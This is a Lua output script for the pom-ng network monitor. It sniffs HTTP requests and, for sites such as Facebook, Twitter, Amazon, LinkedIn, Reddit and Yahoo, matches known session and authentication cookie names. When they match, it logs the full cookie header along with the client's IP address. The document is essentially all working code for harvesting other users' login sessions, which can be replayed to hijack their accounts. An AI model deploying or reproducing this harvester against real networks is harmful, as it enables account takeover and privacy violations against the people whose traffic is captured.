--
--  Session cookie dumping script for pom-ng.
--  Copyright (C) 2013-2014 Guy Martin <gmsoft@tuxicoman.be>
--
--  This program is free software; you can redistribute it and/or modify
--  it under the terms of the GNU General Public License as published by
--  the Free Software Foundation; either version 2 of the License, or
--  (at your option) any later version.
--
--  This program is distributed in the hope that it will be useful,
--  but WITHOUT ANY WARRANTY; without even the implied warranty of
--  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
--  GNU General Public License for more details.
--
--  You should have received a copy of the GNU General Public License
--  along with this program; if not, write to the Free Software
--  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
--

output_http_cookies = pom.output.new("http_cookies", "Save http session cookies", {
	{ "log_file", "string", "http_cookies.log", "Log filename" },
})

cookie_table = {
			["amazon\.[a-z]*$"] = { "x-main" },
			["bit\.ly$"] = { "user" },
			["cisco\.com$"] = { "SMIDENTITY" },
			["cnet\.com$"] = { "urs_sessionId" },
			["enom\.com$"] = { "OatmealCookie", "EmailAddress" },
			["evernode\.com$"] = { "auth" },
			["facebook\.com$"] = { "c_user", "datr", "lu" },
			["www\.fiverr\.com$"] = { "_fiverr_session" },
			["flickr\.com$"] = { "cookie_session" },
			["foursquare\.com$"] = { "ext_id", "XSESSIONID" },
			--["google\.[a-z]*$"] = { "SID", "NID", "HSID", "PREF" },
			["groupme\.com$"] = { "_groupme_session" },
			["news\.ycombinator\.com$"] = { "user" }, -- hackkernewsq
			["www\.linkedin\.com$"] = { "bcookie" },
			["live\.com$"] = { "MSPProf", "MSPAuth", "RPSTAuth", "NAP" },
			["nytimes\.com$"] = { "NYT-S", "nyt-d" },
			["www\.quora\.com$"] = { "m-s", "m-b" },
			["www\.reddit\.com$"] = { "reddit_session" },
			["www\.shutterstock\.com$"] = { "ssssidd" },
			["stackoverflow\.com$"] = { "usr" },
			["tumblr\.com$"] = { "pfp" },
			["twitter\.com$"] = { "_twitter_sess", "auth_token" },
			["vimeo\.com$"] = { "vimeo" },
			["yahoo\.[a-z]*$"] = { "T", "Y", "F" },
			["yelp\.com$"] = { "__utma" },
			["instagram.com"] = { "sessionid" },
		}

function output_http_cookies:process_request(evt)

	local data = evt.data

	local cookie = data["query_headers"]["Cookie"]

	if not cookie then
		return
	end

	local server = data["server_name"]
	local client = data["client_addr"]
	
	
	local found = false
	for hostname, cookies in pairs(cookie_table)
	do
		if server:match(hostname)
		then
			cookie_found = 0
			for k, session_cookie in pairs(cookies)
			do
				if cookie:find(session_cookie)
				then
					cookie_found = cookie_found + 1
				end
			end
			if cookie_found == #cookies
			then
				found = 1
			end
			break
		end
	end

	if not found
	then
		return
	end

	found = false



	self.logfile:write("Session cookies for " .. server .. " from client " .. client .. " : \"" .. cookie .. "\"\n")
	self.logfile:flush()

end

function output_http_cookies:open()

	-- Open the log file
	self.logfile = io.open(self:param_get("log_file"), "a")

	-- Listen to HTTP request event
	self:event_listen_start("http_request", nil, self.process_request)

end

function output_http_cookies:close()

	if self.logfile then
		self.logfile:close()
	end

	self:event_listen_stop("http_request")


end


